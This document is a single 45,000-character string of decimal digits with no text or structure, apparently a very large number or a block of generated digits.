259954072491904851454802573110756668499649261202037918158509350148358135325324155626233888622984463155941814775861673476749935524904569912714913750826244350455976108542711693891942212465494792217973114245861772949000464371816569551636619618352631987676571052986546276192553650411624429218408309512482188523639241374405124782750447251109439309978863927381675944791729988868121013534049091192037490661880402175027491649045578636051431876766027042878127719157833679800249193654160599014451451794384587805503606842858169200947254575645097635173855337326962309380564069853150112532889995473484343603506201029014144248442176799653036944309787429367164840245688297880823806806514282533520307588121306892121563533586236754923517500334933325541040138014327238554690271065084657633242986118926150507537255774443581120035853101957572646051137468397020606651194595465459443820681488066400869226248992201519690768073089017884792160242602338724861578065668560093783993459338624331928209581104284388844409361240803628811644361595308624459759794573248399739681630819730348429133506669063538407737288967516719919027577394510476148236889614792200758244313790423213934295127721802608619061782988157683771035865909319110199747451913490059453652073900566115285275608588842752715505950467229190896620629610543467239540805745383128876929661951306288916453443915017709512550122273682341751138647834830011011153300336306817375580635294517682029600154987831451918655967165711950783659297580136528723473691937473093051458158740961786504021368707826704940516835886137025375670893587847287357712081545492759883419841749601826227898172822841879134133427590539342583221155964227725535668988974710795087520710111826415607201424995682371451129613777528998127297778193130096167964883931923722440816795045060467612604633840984120408456714005008518874306084506401240236542025211234157434209446427247174195824150660891854445352949697015241854440078291457405927896968028354483473278137902396511376538573059677941993458201324703042190876634405885259881121063040740592626912605444861688177785926830985316380259446458690186835598968767066273363749590868638021939879952228995271821828010464625359351339437968809042484915579206176553346305803732377695135498270099950334011237370734935084207669604148206258925934141517811104804070967804249960375295528792693800180314872192784901169365784795991057771323588650961876664368451444322259611562793814381841244978839539772710822267307016640822945689927429040140535365805389896403947433155457593145823297187745012426256862250844363522689278446691583557835173004811986516429940439084290192034988052843425726697868839245665183518190441822442055432002552053313454591260470526147267706479469177843680424330277294996890717703271465285585767398848497707599131541429715384766570054897198784032431799023378794605569366787498261336972525690328974035829403741875640726038016621665570468026920206279860478337357400552124859591304886430709500628688614276550272628893318095082091730433278419991379398125975232751584118186506864729388549580156826689728833315837663840706511777216018785955684916449411059345332446717098716266130726816551407907079075319867931040445895212724456391141337807253023315233033382189627933484746960694718307288265798908710570180052309327646243648681727101609644387804995073071335677486795506372421992105062419492368673532508095662214095104797405145369848310011353514317600092609098486882008124465262993005623012573278253242022317436289569172768433433544036852216351801279531737445879719254138742084962687177746778569064784360597604474153637253819955178896994482816460983777146494571787114784302185289107163927283534892289017499486359316772791249352865997750809617042805745263200962306741014821692489438329018802335982072852202331505501904799879914907709035708832603376644929731133907461454623674813112516221553991509630830243201323380347408577475359449051247816755049782464598154945887221406132258532529657800170925830499363584633956080020525645432973357077333147378064636534176864161061268309973841180946710746137803573882404606281998991504048256394805227513863509258629979923698998840807049075180197174175085188248420845353792126398332692428588159638607306074085819618640352807100596362288528803895952714562912855035691429609822736278576955337719752252193883266081459351808095705813597819119135025041759115089767011139599629907127800210561714004750483928888276856585811257005718891848688117756932380433027258910540263653654051961541768917546592500088578846278018664618815036315016944577073221602285473065465546429809389252374515859521684971764793310488483961091705754209400712250873945992359719347135866661757033811683405667469651966523457365025987258202881547619734295616203913633234011642962386220400707096760151487008541922805741994179090657090637478164377701825519716942847932993444425350835466017439630687071909885275669284231522859856240103171852077106284380922516846788880479365899493824108788914703622248515770725743462687493658398614848769532069087587169798020647074502568659637921385728667036918402374326382298881158255706358424213152491404830398674576841505028889567754732101774526457720141201653473669818323296287251594909657018523710669664259064011286500850488411698229715134606489647168377934678260964173725962289450491840269024786978606275448616600837724773589257639794391883777777772933927647435279122334173923040329474721049327614919528065619448932207726630075675457272434775160111976341132385872613477179528235598984347844496581978089933352138132601021583835050068398484168923319141601095019946755900801236702303572083938751028725817526824077674170031783215181298894229751694432922532396505164118803365255014433965471537134944948048884986615898522842144332388902990223356363578634715347066505993779379617940979410598784485733502740113883254669210008809929199118251505834952403533765946385922736469707823801222949403836152840777976496112884318271535443462102811822052457999102049702664918186103435443926081751095617543954897968228969804148732798026474950286004081950795554600444573464127342882613633423562839360996261066784720549068833730571456698736050092751937628004380551504322671729479898749715610311650985254990297646311805475889283933853584088649641349840937989601333586271587890879511456289823945922598613227751155973538394552743162933415558401661385959830002988745608369609037496804483358572239652974044743287593911205348461723209577598477834806255908648020971186195949603895427159681777764911946793717976147165517639249791502648518427274489823580585769062391992103685476245061208650044770360317872893879440657314740424814923756785402246482543738412386573338320619695355688627129430350705208540604258299555104355449795130113326090192978889757593876580003466564336138592919678315723872279691622467746766991883212182995387003759660360258053767424487480922174777554104549129197785162791718609494671746440108675485779561166030691379201779613503768626672189220507681078732316570467359712161464997548774862065289697176258469888081603454304184725140061318203573939284367640254542447371537680938665976124365469181950309771221431313898127670387318219865875335691787735081276103255835306455221097295540856588298625398830317524088643085204246771935598053918294124265378736029707643593247106437963362177838346232802862738965598848258301680046949858336803144093927793598018119993258653504009166906308894893168884169418425123432041253905444266769197360978709443137022524434640539960814859694201662535899624553365943689898683509124716995186035339500524107012348901022266417118809216063738660905361665968675170870868434314795505749405129039366692356609673262497203929626447409661334217361760029060942852911126845384833510804848159322369153875309009194866463173323791556474795420093867156680368235020748791699991222871357434774775755984700580109953827743138919719720877733929846728965160942702255543241408039129698571436421169297169975451396397823458476145802271061228947474094341398713400167158475422394332157420274274682699378694088745787006113354112103283599077778138139072873193839630953209489256619138644381393117510943558648384249906530321647163016127297681627452019105210132196937414168383129982723678931959170472849207600454183070977856089718211374684181914943915532376864276255461132949492650992245541911049377666888373997217475547172500452442693082856629777207903620819279788358685870252613221559323211079151583239354643061177777420556610725793756838248105510608759309750710901304467343096858490320529643252428799655492917785237436700298714976549191983913993538810009217783234662888735012620655651269556471359370519075552067204934503736040268945175367302003279983277124248134791427245636955072325708379135288052464642984607216985871658698103077409410422945233718048200588679568083861310764820079485497101704201806627117865623576780069669623901989503133251384203209594750478039783101747885534439426596923702550393351642803002393127566492783770240171472492120623267615559164966599617096665329278509286965797154004413227512619688394893483708540523565293223400136542259809560975885533209082104133384440757173134720195315115714152062111349707616260715193723358448943931493449925764373202269685594009928267501200959126754586682804375333063984339288758771613429372268887239349988060738701705089527656630759016092165589820217746749318323762390924402532850415599970805963331549870432227575253157104928908100079268041167009477984097292068303738526114137333099629933640518626561109958888413119493819183434330211544034898183388031773486022237828661460202779192252849364691316848342569323974258407119348036449355922807273475475782999073499562049551297951392952113156603583060683063895873046782471108368768342790717373689138701009209457009766013424329903150772009149504030342188187137991910169859223521288846431640248496491829452592797277748489253685062160400546416028112653368755811201825876881214800097197443473466168827355414607925157771408013081042278130204412345538322334374141601628354007941561161975878017407531533532029136778771019587763817413627226092638205772898754620990736438274430151798447861622629077029238101302143378335283325741272590375826816778211755794986967145531705668850416341409544233413918674457755668248457101510034149037195786291176645631760343807697693092057540552643486612877686665630926970287279950594102885114050044135204056293409616692532462039544502237645638489464238080086274213755147842714153619907608267258004822167899803976944443487214669100313617692556619008477349940766533132386970254496896831271055195311835324839759186859908784273628376868619635136631204804829824651375211207315464722321833549985015691994209460893715985507637835612585579748981464688665880190354294432011595206917492977606749486833695067918784788704915545981356024098026278449475654226240855702720326268311357887479026072976183887053615169053745439685663214407233657512971196743932965954574861537419341800467138569238560965558513908722275126110067616656315966637757445286788438293153509325594135768592423353698275145937640163593666036685417027442392225330415311433574999327422329871334152725690987620432610147227161448165110711959319419151482267445477853379199804512875438687951663227496733843642789986882016817614190261272882652232316711154470076711893877680158855938527897762570049901394749889772218691107114655914168349505070853921621517799336253414560449549796135420063736951825667521472236016489988922644527814641174333049464030686530119248918873512504155466509754567389891496671932249288217599208764082088857090534500763251102724959343934538555904598756907038597238627331250217069951620824951301103928854515940717592509888585541550781884381309819439311444808794879263582243175767678349129540727790198281898603873916717357428561388100175224298398998054081378763161490229178756655805321107049007372410280682365620519787180375914947707624792496046479619030679263552513559918050154785622136419758172743705079149634690559888341420795880076026645089445975769232920319966495939429105345445460688489349836055591530960758005233225688738443315013088036227106442227414726833586357538079815217169337758158098876487085561247499560810036403628152667261469453752685146212927256021946448636413290959692274986955897970838626636148299415967969110139195204790009747562996455527526572324696075499445703836322748840792393255587074250762799313027782154940209460383520340007497459413429876232313354503648851523045813040724686441886187634828738140978681562509928495695174542710489218918056530212544852471644766885348865596506567164764193766889825648194734053856423649405778906236620875000861973209214480548944795238634219648671018144928664606455644029452447060789423121234283885619616877927268677767317492211351842732687357122776044624273742001392195014893182319572609482634427678601516091046671778464005861176441861566749022136946598894634030171753550441341178478119555404274747240505577258342411909701407747450273019067781917797519936646288549351419112709510913234081322184014179318710220105316304170809293816536301731642352984398667063164158077735708707134150722557471774057555716523891094383197347816803421482625231112868123666932874699711869486361949107864000673400106588051322761258104698757656202170730911394161622928681543765168652559863441450714706573329206774377222694347228888942592972288143597686587976529102541445495336315648727217312414569371342105194077737721182570060387390647009822434218527008000897927926608565404235691557181763237852556422329196152848137698521031986257665494158961863263957347896280859132889249618546923496525392758643687619749540727000381873693338514750690386831114617592276146245610148222776366139664272358306656796666130668258761381995720973371761991078914471527783947388402173523158818738261078015392266729485978020232202283665757685196672075804831371945757805485320965666618069458555676520175426198400499728257961012734706938075363119446955648821436592150387990182951304860625459053822879970262538411713501389904309161871385796438493439987601669789408084185416315177347228678163875508013715236066676242987189942491757859345680276132601079725296205087421483443501019999436618302534635780220894289717143913205377449636582434383693017471164863525612349825787882041236367708126268681343176432219272057451107035478355589168260364810440438285848352407910204298663463600371131481727751964756515755098795112309929209963953244156624924915986440620370773494357410021731184863059568785306365618671275599149220465228519367313338902949875558697298151195076696833081773502640208224547315117777154816471670545815328056897744166098231242448099309273395094812576669430263757147062215769183613006772635489023785400579127414630892948809040898892671264035582627605669332017176591676363926082052918880041699942154041007674725057921538932397805406863580495816919397744027345627589470487549635322006434797145668338113821423432821834612128638823601944402202414637741865882797557258671002990048814372542654135959190521490689760381600617298624597621842233843939140032565377184856343437834051213970796750138113098743122959201735667395175998549881778141396847416628151331311603678134943952814976843063301772950137842246958659317869282094390875345261105146025620672230688829199038656888156130709199526687856996341375628875591649116149693304033333626531506691497682892926199891796038854710031710818420164147730089679439077058374776485945142852082699667711452056993988973476415370679709691204882664795798039990695012413713409145573215376819233346052337926851926518880465476305241305447907913298855958636798945575817292572747226180971372972301168799155321282973978008893037501243883535227168597755091378522472632406177133279337857361253548104975224100328594003201805788569046455706757692993803918169396474435250614790778881929450240534059540571131861359422593293371327517889969493499214537023644879672943520672087978130242417230393404279071371980593666305412950670826195650373352847891385994137427660861323482277639673157562760021122167698798058831721840426221626228657959335409898269937563495626203893163475937660553090918365205620082332741998349958030950974642034502276379790727244957337742334120470901862081643075331857261927512766313206518415363666708698629067689778670802306417102198201432212060191536958642555921526360580861053150985821536133972221620521160570380175587606323473464759981484575882378058937896330506913439546988919975099383226834352769779713328231724392707701960909874720605952095218611977769785818374603140423310676317298965018970081641624305898246167455171235762898523125778521675523865776798974428625199859111166285055262727100688980968574702845591244078258350683087299494824211055989531341680196024272371611988125416024090117280267713511624826987655263515021890435813078034471248602563367421150555474871599251712950304340104319262241414016166517519573704572368980212953548742959167616308984900614042930214309416585557716137463702705516977896624027351894107547544827707731525161838214564015994895207439210003577895521828659609629022671378511240256018361559720436509256724802838021316516136248315614383950759356752384954325685211417791399045139533710097167053301259801734523737162102733908649966532102566848299732353556241709178985255500542048689062864652073819638256719337866591090314329473523860560864483399362199598461368616038134404524273573510765779005445711198573044751812978630091893529125990014724092910301493598640174525965789586731432383197340806221337110424466144001611453504868652177888201864556085947161129592471262959110509052950614465213876667664964481989054980858819176542385391417646507360955686685475736755690942134923405611074129549975701324755529122943884686283147819259847969236998020881658144280136210746156809782111813465242915661021842744472725042615545932632095085170577321348752691448899207136804171770913502820220512998521190681975786923731079954478486038375664960520773278692759516369956750216104750992328696218734421217532474291133418281575467786022112997297482699832704873447755939716335508865981774163215031314548854761084338991418841714522547073962609872819103842007655509113320278208808490781153015184665518418294328639202983771710491595744894862805331738394183839675092065324412726544063257881081370381016343343406070142311010713194902471532643516425079708008017598330239089999340482121144832039578512521524814113170817735769471682950075222257408198300092859578976504756899805318079133582823160658583482617383450389554815086283310491867423391524078195547012339816490286258104556978866834725315961335957787254813896700393185210100589041349831419969507383042577243608616870943207952562704972593539372502680228190233535739197803715688485669576541176570662892226400565105551180596903862258497732004572216400205836400502799888564253539480955544694448613191679553967264571500770627173949528180839024734375174749277467323518962866562545335425030947885235679895353018999079884025378936741406977806676091302101392894163320438229219082940115852142903802164587374355332489351266445632360748058605776642444854486597706908830760068856080968041486836302736019638654683625646824378131038199826465451394477630650652355577778127841060053889474647631101251112917155210563851355143158983028034249278325428962351075937484320957715501022187954372674281229859536217002147218159747767980677010325244744505928246573702147322063708083059054003905258365850329726417584660054312822413368430126700484021921117858474428421411677082159292063513933109625805880995227800720246135040313660306464589519218711063964549627767126828355349792366909745314446351736192493459128062067770684895024144666918652836424410750181483500070308989236109971061339549214176324879828444216437322638681707822095916339986062731044030858497270648274123500499663652981816909518243559067424773067631382579323469704043307569174343107466612120974923454761172872671581832629658266944811648083682167229919880806951142010643675809941484888232216718861276725546518531706327854546207193299414350825646908613229834803104163584261148383243400703754872411629826896586999094413409377878294532715204747188535048579702929943716689183164974639443941741921282109724315527185555492929913708722339374963468348574850417995317879573421384316766369561591668704271505454208379510913863708688289457482120200865149299205823483768062840454558642975467622536841237752048909512252482387851171407904009289235383301131381955239240323206876056552477848564729191386977530598632416794779175726640333752527694683703373748002559586390065757070615088735550097637235226309097365641122398354761816212519696062091251463668017880399653749198086501158020455580972781703903579185581414300020139631369341981278602022573084379601304171077367880886270728077431517114698655620805467672056615263467261976305703537683407611217724155228343238428896707213603551917263137430131865352215935632524730818355168077351487222799426661621564010271299065675924766094319656513068463392834680005552637065070394905502869179255445223763378498811069545641326564438481698006747073547901895008049427634609439892660955066319284030262396579191417670348171955471812929334638677483578552073521415719057164469448594532131217519097626493378440894525497531961401603329300606442885311358899317556065815906636618332070363745986022423902401976056126720903451172501841550253148218531694621044095327790729950624092362558494687352130554001028337634503771034206439848220798135049938665516487662026509271047381558615536344651341428816654528546660378049032412444203926816719048982913552756688492711646414911209693031861303080456456367557223590987292153633385309244586552266623381786350356744986366474053079067500045261800042295578374172438413437806105721037973951190717035381026338346407409411840218284064546807777207306173240670505920301589998455257032159070758876860323283991376352786834194138377653872047647429906861379443204647325434154310065217785047279909268186477323277498592969200912113186140916976315170961599753783183714391920084451803799979612021269365559635460505712402051526024794836033322504228879072433577684804242535750494813356806004263668652542581520968163417217429873066031682745319709272117811637228902958953963018532857959190899254896595324353550498346070359699546643079275887672091481823650861684519534723569686795757903018669071214933496833732821304602064533220462453635764387853553315387881293320075891286458559771038488700604508072339942692164564296066511226247852858886896968459136094598655632010512081598102449607149701374935666488555157848777206903013072900897922646823418810470981262055064629869781214633086243029151180379895525197682270951447673259674051118849017430573489305991601662763940505410323795659365747478039095250567532735025335086872111780892156612331342873713676187860008958859133387220613906665634930167433918357067538029441772272750073366055888496110892400980869684730969020532765038980641141884652519132424914412786270616038191197687889830754857713097500299733177620013324218474385823573002004748991027213690568380915468898258167819882233376634257691467723347099778686789489129535082291598196415175206235150378279975848390379733158302378929765934347291434713943687292032584852533699252387335177765927627579835029404306600895616655737978041657533785956185285152728237158027934848533763509272380352678501554928788287801464485318739358623933589884957181638307297773299642225565510547852264972924591112823366509248891033665628975026161827066433992330611327695124020961084012777845284895583140858393178708970456663544988213511622774464408374563170256573760011626879805034919181448597480989136893043088312456170574903880160415408232867119522359844725973908263822566634677379483373567584943211034970421893537805883210447172751181432454686982479620071483456909717378745091843698582730316319626983709061140365951765060103050684213780799922971669016893787732668018675670191294008879751935535947601718245586196084442637175223730618945477610229679896921533258511219709996547491379717207537551968480201223860134042195691627902257190000418650007619496310858783853173928495083741747152673245882619405858869515697693151575762236324232839586528261544723963386443356674560079564493998779837329516406843783303867070546337820346810514259101548359887325214697738398541854130170290378450487260041749299718020588634211715722785293649505414760416173629822824442677591151733947409728334077076021282476435725846754197278148539267266498030425881842818270922054615929775921839803430563910573594736447664704525878435009364992738754693074292901446373990285119290232713616716353012189589007729463325243601818607845942416724766688382591326969089939012791353431213812503300510346163572124251589571150873766278427780610372663714278889091909553944038564349861445176184760263285050422723083870617908436807496712101322501563786162137965670009690035788269126000073610088257641935249970347557454915779387928888927420837552356922944656415680670810644939278899387382686491606632587225149218422201407868639767832221139007734653756763544608198757064060446076418113812450461457729899452564058196507807817472408402179797749377907421405526404474478541749320517155631894100922164404477417035178799090407965394496271585130452670418876244683235717090260172644183755171824746603465788589123457163859146390183964067387798937262793005202384660719281312151772904041024753442524118889867137467426658388170301659781843455408279749121567554756601553327372323684694709256141768504940356357800566860025756203677391908264920953401186241313943203817946998045478747320919267177709370627403417467850267878621739035492621727787494322680787754513115505482217468016721531253397952986779814886478137920549320725867831196117000349779648179632145603677682011080279678211038734144375520073154151362377242360268619079931799192300958839456210710481735650037338051697045303719733682431226102993544901853272060363095562028542250487143654713186439176411177545564404458960327338619054514806124248404746574511911636628727787495206578839830121597626174805119626063689162117202428144689824999955927562258504897093042543097277506868708382317824480652769506199135692162552176338579583673464740369787313409085394605881654584016779655243146310503992483381907222303448444829832681836053346007830411415709260934993453851855170170409978165553645037246238571127087280080443753161346772882405751349337859881230994951594389100342903324965374229157452420519058324956170807190806210574637327743854766964851322703338466807856943459851269741256136176684396214811662421058735864711779374112029066423490114773244240524276994416540145410866360778975641395014887799767158429630482087417913700271750172689062617665684813553763135355637716340838165493132205255483369806539712259643140373652078237705891766020896601168824166354542720072300759860370946829916761505197463600432698328811939939416778310984099404438365493799349778653053399814692545964896968410732500516478072363584593253541544895500848491938395542046046558828768941476484043196174361107275642737691025775607636460673160066990721108845209920584374172900291549106056034319633437590192228241198288372895957349070593596306841150656811243391778157233509960552172401360961088000207315026765046892585868587149904870729670099090452471775153435890164826733738530663954340926642357313349566490376374074924607747409337611762318129029271927705285991623268845989199200225479714111566466763689849129819452839427961050591257891292575344056184051947175507621747643483108461519039967894128304919829175979429115175333235720424265100544965173669806638641065205024872403851549293462007490193134515427007861158259649975321177008945245410630982988327247404428196133529455453039330117796900974956078761734036025544159961538459159909510912342965119191759841304007950172314624259527601798724959435885508470090827111987100930269315393807927405828929216986303319106666784928397384857161319814806807742012589862822909954625245241818064713585430674706314591553930061188151291608472318601432983614976133420104455921663325254147796207115759713349860736912593473749549496114519556018190337326156287145163449116531049230913508121834730298383424289330839891400830215647245027925279608918055372922910692212028285863542021565213835925715440790010446939471169133738966759476100009235643884518517621250609077607738983640042811391269745670136507286689234262935662753551839382311121807685770705606313277428362960927755138288130837854577400534355650706828379526771457128212503290597798489498635947864945571141474542917446365204224175073202719108852075087678458915782633157780323063901806318983485246819392000670117590186184697122944443742119164624923298121220075258592584571223264674236563107722333547636891056819583651204796886832581265868598273940136686190033781123877137481383134808537186475719475102210001892329195392309634842515273494646656459447502171833527331414909251919315141289274834071426430302295099417161800794073840875204789339038062494376740403180324442233823959870510597801546875758980549761957691107784995013133361508151939070859433941059231831489451442762151665861586615794583245332530632504107752470787569739663650023647197445758943082358089807321896688655945884380048484147226451663742511600040376563387451531320566193474540420409499132588826845787827782465567350695562162454673124877227390028554813386900215420206931051288508940837613926988854332219075688885478662356583860058296887942238177573080715988121479776716967318583285147608158597274278525964555122675855325341296103682967972053232284346242715739451623009731958007920830449525041816179262771980953420258484463630071647351196775819583457009095747334213113252129476449972778058614276183663722812490230170588775021582641783986975813317057816867191881000232164083447538738532222182434125415480120729383761378672403542441915492541692144044858107337658287479905012440101729700404438662762667200636470770271380617469516560745196772752066308076192304312899796779569782421380058625752676652165584735464985979148557024608424633146935444604002798853187889330630727353941937482529038237308248841074462515375685654259802469182110973241691977999326630854756254992911077597740797381637397660858309289326318241286358158832572155714495448655401694121887459887886391652576762729398189909932311345772613786674834051129066615834195720841908758640912109676430229899035479858349916275037437845043636451445531886197972285017584186360567873930519926237961205400225750846383285722267642865993776076783832387385190818778632479131078830930969595239152450956038716007566701022938389715237935385241187136380009901424858006409091281180665626767674059618831458147969277624480914026938596662975515677394241808753291794672944841645017106925033848149091636688384642529576873905634043723662072961991120253359211264047109747074317300476507540129760103407120049619252206145974188860177596124591512570287938658597803783243861945932840268255455930876974716539950066956589362319254363631204447165549443427638459557812477740671611735672262588647392319366093647068092992833510257927896759277066030049451193873807221868609822169672757303731228294876158330784051542655139846703806028985165951887763286068092052231839054578188302272953767139211761331463959881750447292941545499794015822451319040734743105303322005968084389099784687226838109171913822016019391319763345237161649721539969405511094876091768924414400627312399432870617457615044135662793337319388469332839273479823266623173371888410011410805699888347848555763701051920145700765115744255968756073699855791249114803875758638787087371566820824480101179466569483521825138133246856288919159305765109192570884634193672485467417357835125139530463617230438026514487341361890587994823273547622982897152093802841341050937767633356039428811212715595663149843642057131538485123542878680654551750827535733448216674331160810353711890044767788656740720495278099774049963518778015210421245363800083853884208048195187017061260807515921104049822441872594678695057500827157996750930092080096838210662643641950658795505773927676318794386596280320099822263772319456063279201883867774259526085763635733784567312021466548324720542777647902496194996685259102526092250266349267891992812448457854305364107884855435992469466186791051427567804373264491608559059230030296243749744197567120562711920917256000051491309843585273539891087106726949703423610547669750720986472282413609552227424010151281489091287501971454821921714408303411671963912869990287906276625901297416146879297031719365737817183569852509083689612946576155260715662814486891012355673366924373497736727641472386179258411152379847621084595425357027243227483564230137265213707006991907242779130666593480718622607123937344137416197229327715663990536932043725061631491260121578342973510919959285279990799633200330584720562529581245630274849344422316262392862597036564498930830389546873670542620880549301341752947425225399619901508104947315585521649991753782574262588426895025768180611872062041951209752928594784604382971237569781577311726212316658885732717725348166328209669408827964144984946121508309525450095093968645424417579098046626112191649771366266577870935416556792918179566457871534988219368233163338184207203996226634782711167184493837155222134989156959432895070264055356350864098981077573310392463775715140022042387988841671570198207923128236438856905332970910862148033236708395083088637167309240252307036724866932917548051138764665132949792010175974211819912851603943382099349157192067831951167672901830257297046137693399082013246231140486728299954530682937752502491175815225921254355067590670547126882774743740750824315728726754749116374177934492505151710173151999513072543695951795751584895200214712476634266319175356353430041128894489019132030063802380104244834403532660254717422529723372203293095419522167316023163723014431830656619074483176481877749647413706569748911808743462196769694791551033658853225858224876453890096321670073619136606029327628682535730576568497716932809456700762797828009105190681023961237196597320130456656378730524752307677119272765275922208004320774261757123152739793043719556902132417935549464690461924041088121554040089557877389706877890360348221403269444656119931273229872940605370027526060004703849644436989448512151510785236833169565273471077861393483864145672379167453473764507159368631820735713913542869340825925953756279419662247613861876088259856978378140214522417985376922498969191139353657278528535041061575453708750727468706619535416314054586581919553307310009219931975073370607483375511408034961730549995256040365683018879485127317179003876848027083947980812624987428414428998493850301675526812829010110868277024670734048855235833757741375916870121237577241970999742136344624233351193113275581044715738353970185004133532240194149647785147100509678306881045669553335439986991197320800971648237540157512536065685961671047204711716676454847227246092424951245805197541002646844761976361791437426888442216125956482184879265572065820208057547785421528779707084830187134798649161290133501476918124739780151266927724700878144932791054779370199090781431725416524772983344126841743584959789763461914540932015222344949925080473167635736179880555173669129461300065416097099939837982563154693349758638081595087825794437655227370868487495012735750032474105416320969044337808773159647679374781148409886534242410845539656056428391973517035172545071282940838251406856204928676474327007536597349055839581677685244356579563016133062088048589845065932856287960137670476920245574986576670109300811535450002652557273538746590167657715253812513808425086736277963579773960153465730461906001450083425416667000288208696209542071290094368033976613981018039024100571787520201973489209909514731225897114993274310469524122053939294004125617876241211565299933273330426134433187302038756393171154490627870332194026868472588015124626955621046483687156524410430601027349432990211755901496467607266345434637199067764655586142352543355855156474098544757988026439447975036548722116673935083138787076152374606057277327680502960675314229144351491837800048491668764941804746514786153094553153309069044467374644721916353048057576959275919422362066715172910785999955674220247519486373398592599947543183109918302727649248015740684212837821400818512771894678201199683632335954265362410984570154380943397617177525590678726183114397783886321790827115844052162015527480732823942964266211710306651949911422492013461928876041192512473007175658294068525812759132449225114447132774180373588490631090975191762490046853032048391144082831835515291954748479228904495144426442947947875963913791082979940158236668135322996851836377450103470912459712730172364137390080685621307515823192107301605243950318877309599358259239178904821645408526895913161196867483469266558855405250919927762368373308052486277735938740773714014932824672648764788595441039437774726092613756915658588225731982148161639133278779736540169061684900486941800547279143598501369070826124225722025086707873391413332181342248838578271700727798694529375747068048019465761015368702736372442459016627222487069458538254623201231780866713602984858614045085159884276793416613047916990111843246873405765835075280415913550927801188857798031461591772301289162341807037848367614372640209622271478472706174749645402691897195633311915109917143836849852708895757693988322915311036607593316224128617699698405709378909026712464036616353631314388824251681712645535419298488790189781291508193445847659085494319300800576586760094567804641321711662444232326783169329573794414878286768099334486821073054849248949960908097947367507538873447347079585967361940938255824263104674313878850931354984549598566830390105055487701132611680754166561145430851186347852981438647132089889090652977145769781634583685644656040271063316529885544869950597370827888649736491894986182301870431228651708325347428234648053521963876590827750049824343738583247057734685501888458131142886648599912487470819929548458060917616735411873530090636211209182154245766989301552437810072216017449027725603540311118378806488448861739908449585730810019123329085845941210719083084110138109467949299292630994801280253322131292462517433063925410811723338970507245278436475939874342302737667050193169249718267301782914561363629420505895880033304149694726779655292360400831375610082592907955066171502684206824999243542300341198370865395217340941867634031467736325458953646015311400953987088528859230101614872336216649628920594336306569954545388834997209170131381890093087845704184705645981384702293275649910177353030702461217225343965721518658047700774381198936008009295692144689815082352076751127689214994726887100161985108186324931499268029900145397025760826503638021490041853061031883080215757301890754046406251141597759972951157224193944549956908528909134043239982772922068556759571726292934396194884380452188663278813914789287104911889465604586301111316510544712302496338740393565620482359011385246008496257328885428633831533976191131639245729060324959840919367735549846122457614712770466523149624546115118801661774415225760920590456334619151584026334786551105064668690398917760172837023695333816427121292286626703392632388231711697742315353696807106730185768472891309682484602516889620260699735470431135687033717380090513277134310458355424285612600463522666807664375601264171365282806044263235375803911163425719022678798185386764171138800420221985439717722814916469846045944485063277155059992895315554295523284835512658949822209108332438677536787113888798498499204848370957100108244713038874140236230700260866634421021172453086710020404088908532720409528349577411492086760841984365698413643766416405500751622266792468280716190934497870091570854892826764463939894936748194379620591788703455078874518634775476285882334161544015674720263179222890059606232967679072823596022983507598490480955724459289153983210932855028874642407242421445793488811695728023139910329129063116500745204284430165717987631518508421616315277800273933185448109886394374012676457777740918076648798730804861391169731149982270219650820613488432070388944541464192716147617107680864839562524013365554196109926813253019336620967805187984221104171121149993546514652106751024554537150617451662101363724590385385733341166372864051311021093271476012420869301147805859335856218547833816554033455718932916305590776558241741889593128940661549248520650061430844863888731832906133439663782238814858714348820259196297806809847280364470096840556259103811518667748651945297346992965874148806214114525596417541275149549617501328795104677045635497955951923532856870337320308589495215182898060037599226545924964450035278485941495576216913911549024082013130620207522294239651288569103539028176586592974455309586392839697834849279611593519700868588871294078961688249331367559963099105013691243962070504276675150619653823120810722210603773868324055414298958573830182158231480603149027542237857541641063232599662539035795179507926966141532348325482149845167659201960790850941076603150615546685989012429494300800062081906781205119901396386578392739291458932128035904614801849877698127508193493146178939708998162923525885913507297786046486858575366781561444158948034920509487073099133367422038619437770975229343003593202554878879884002568951459885105890299662182219188223508465728298832805201656955366618826307692298660299249011239401523828145906943220178031251539234514168271749055850915679268652528026167555857944468969940434763086995932132769520264094341270384236433950610433796067118306964452386656156886560510465653496316484317284230710085458457265691553907505059560052603423346153416102520722671032320926834232075510448100238995818476247564939607241464604822926849046187529494635818456965827599814415257682365864692735409374206760054349728561197547132049699670399501350585479323679721735490015867804130155997823780389064506618525400073670275460271782589773700894823252529453313535973312124267285097444710691665703484772067995063716679958479490938591723593183238315449806490336605720712768353164603500952457021384233033183411333855133023442254292417155307718899724564936019728447607021085522974123185925317304557229395846979863096090787175126451859787127923196828105725702702823048033579297028422544498346579564086017789934464973453532753120644259829920946628216573651224903680286414190535264567410623149940406297795848847288801640481268789986754626948706846313312700029974966241662003759936389223155397478066308165721189656635720533637865038818793961137043647861336422613077913143550628253394350006348651133516409907103402817031251669059083089898781355495692830782518521224880825523497870752656853930436237255493093049651284715123126109527365786839177902446219505850699377513596064003030507727853389003954845050538635910345758343817566063558723031864452775615679664295590909592226068266291203895027755719382921567906061364903569251432077799285730949360204059254108754872363819413567679938320350229134527779217664003032773577071307368683658306699542503796970799228970466819496382111232523664312855707685614009362393398601021538959237782926935569082680839394262910097618661102885890298735640704306044480963416380645048090996164634940680819151066761981393221746130751428204256611745279438143770618986730755005407661393163679298832787722593333662136649517951829699913317011044625066469046497216947191012820035176417329529730521699135759675305964048301702262133662172028353647341998029386258127856092107071553700643322829995133660528448501714413728116260441890102417071034106464109862692474996064861334668580953965883662348792654940314701668533762277051249241512663734844452707002661550736053063902059018001043663337207286527006437433114523657931611584844490902141805041233994770221797089979839205176793759177829425207591212809818647590963357884118791020497623038633857527554948203582153201834339223716274610848049397652431297484250415379046279755355847663358357220557533786244385573453068749623197227347721832136250707874090313113417380859522066882218097999282594462197161604174307639376221235068739785752623329460049959614983704222706104754532576673305974477656660456615781256587840670902128252549431622107251686612691785548323590515739938025843373794311534591524764077080745010792486480718022177758624567084909928103591559575187572559730869928059867287056080770543416861077480043102230189041669279093211960026052805174068197971442512195967116102381017865966109065457493189598223676390359957335718819127146713812916203123101107457740958486043695537452316746498818627611677636947428200158706144861335328819831741321249873773599571548034396924645331501661484813157256532476694771176369205148417926323536541695918160209764096098617949780880379359753508868299885254920588885651396365067954504265093421671798905199782372744437410289634541742121170624792464543476456335743528979759461104612416152512708687044450871368137741836522826285090696175070925152720578519834022206226263272573060855982694951058313161570079290746949762716075622718575582170474469891088880425322802725125991351906623218631262863400804242466563212956591805298222793575652125888277480190663829517655361338845667057244132173574717534281187890899380385954531200968276020277973491364491273063806090375855009048833263092784599464169881599129008668169464389843128877777403251055325440526828624666342759716896822313025019922493989468868607737655411530155856116619463641726363189269772570569389610028942526763765357540055169003729917168429603878406938062890